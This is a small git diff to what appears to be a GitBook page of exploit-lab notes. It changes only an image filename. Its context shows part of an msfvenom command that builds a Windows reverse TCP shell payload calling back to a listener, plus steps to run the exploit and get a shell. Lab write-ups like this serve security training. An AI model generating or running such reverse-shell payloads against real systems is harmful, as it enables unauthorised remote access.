@@ -400,4 +400,4 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thr
 * Go back to your exploit and run it
 * You should have a shell
 
-<figure><img src="../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (18) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
